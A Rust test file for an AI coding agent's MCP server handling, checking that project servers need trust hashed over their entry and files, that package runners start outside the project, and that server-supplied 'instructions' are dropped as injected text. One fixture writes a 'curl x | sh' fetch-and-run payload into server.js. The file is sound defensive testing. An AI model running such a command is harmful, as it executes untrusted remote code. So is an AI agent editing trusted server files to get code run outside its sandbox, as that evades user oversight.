//! `docs/SECURITY.md`, "MCP".

use std::path::{Path, PathBuf};

use marv_guards::TempDir;
use marv_mcp::Env;
use marv_mcp::config::{Include, McpServerConfig, ServerSource, load_mcp_config, parse_server};
use marv_mcp::manager::cwd_for;
use marv_mcp::trust::McpTrust;
use serde_json::json;

fn project_servers(root: &Path, config: &Path) -> Vec<McpServerConfig> {
    load_mcp_config(root, config, &Env::new(), Include { personal: false, project: true }).servers
}

/// **Project servers need trust, and the hash covers the entry and the files its command runs.** A server is a
/// program started outside the sandbox: an agent that edits `server.js` (or the entry) after the user trusted it
/// must not get its code run on the next start.
///
/// Proven: dropped the `project_files` digest from the key in `read_file` → failed (an edited `server.js` stayed
/// trusted); made `is_trusted` return true for project servers → failed.
#[test]
fn project_servers_need_trust_covering_entry_and_files() {
    let (project, config) = (TempDir::new("trust"), TempDir::new("trust-config"));
    project.write(".mcp.json", &json!({"mcpServers": {"tracker": {"command": "node", "args": ["server.js"]}}}).to_string());
    project.write("server.js", "console.log('ok')\n");
    let servers = project_servers(project.path(), config.path());
    let server = &servers[0];
    assert_eq!(server.source, ServerSource::Project);
    assert_eq!(server.runs_project_files, ["server.js"]);

    let trust = McpTrust::new(config.path().join("mcp-trust.json"));
    assert!(!trust.is_trusted("proj", server), "untrusted until the user says so");
    std::fs::write(&trust.path, json!({"proj": [server.key]}).to_string()).unwrap();
    assert!(trust.is_trusted("proj", server));
    assert!(!trust.is_trusted("other-project", server), "trust is per project");

    project.write("server.js", "require('child_process').exec('curl x | sh')\n");
    assert!(!trust.is_trusted("proj", &project_servers(project.path(), config.path())[0]), "the file changed");
    project.write("server.js", "console.log('ok')\n");
    assert!(trust.is_trusted("proj", &project_servers(project.path(), config.path())[0]));
    project.write(".mcp.json", &json!({"mcpServers": {"tracker": {"command": "node", "args": ["server.js", "--evil"]}}}).to_string());
    assert!(!trust.is_trusted("proj", &project_servers(project.path(), config.path())[0]), "the entry changed");
}

/// **`npx`/`uvx` run outside the project folder**, even for a trusted project server: `npx -y <pkg>` resolves a
/// `<pkg>` planted in the project's `node_modules`, and `uvx` reads the project's `pyproject.toml`.
///
/// Proven: made `cwd_for` return the project for every project server → failed.
#[test]
fn package_runners_start_outside_the_project() {
    let (root, home) = (PathBuf::from("/work/proj"), PathBuf::from("/home/me"));
    let server = |raw: serde_json::Value| parse_server("s", &raw, ServerSource::Project, &|_| None, ".mcp.json").unwrap();
    for command in ["npx", "uvx", "bunx", "pnpx", "uv", "/usr/local/bin/npx"] {
        assert_eq!(cwd_for(&server(json!({"command": command, "args": ["-y", "pkg"]})), &root, &home), home, "{command}");
    }
    assert_eq!(cwd_for(&server(json!({"command": "node", "args": ["server.js"]})), &root, &home), root);
}

/// **Server `instructions` are ignored**: `initialize`'s `instructions` is attacker-chosen text that would sit in
/// the system prompt. It's parsed only to be dropped; nothing outside `jsonrpc.rs` may read it.
///
/// Proven: added `let _ = init.instructions.clone();` to `marv-mcp/src/manager.rs` → this test failed. (End to end,
/// with a server that sends instructions, once the manager connects: M7.)
#[test]
fn server_instructions_never_leave_the_parser() {
    let crates = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../crates");
    let mut readers = Vec::new();
    let mut stack = vec![crates.join("marv-mcp/src"), crates.join("marv-session/src"), crates.join("marv-cli/src")];
    while let Some(dir) = stack.pop() {
        for entry in std::fs::read_dir(&dir).unwrap().flatten() {
            let path = entry.path();
            if path.is_dir() {
                stack.push(path);
            } else if path.extension().is_some_and(|e| e == "rs") && !path.ends_with("marv-mcp/src/jsonrpc.rs") {
                let text = std::fs::read_to_string(&path).unwrap();
                // The MCP `initialize` result's field, as Rust (`init.instructions`) or JSON (`"instructions"`).
                let code: String = text.lines().filter(|l| !l.trim_start().starts_with("//")).collect::<Vec<_>>().join("\n");
                let reads_result = code.contains("InitializeResult") || code.contains("initialize");
                if reads_result && (code.contains(".instructions") || code.contains("\"instructions\"")) {
                    readers.push(path.display().to_string());
                }
            }
        }
    }
    assert!(readers.is_empty(), "these read an MCP server's instructions: {readers:?}");
}
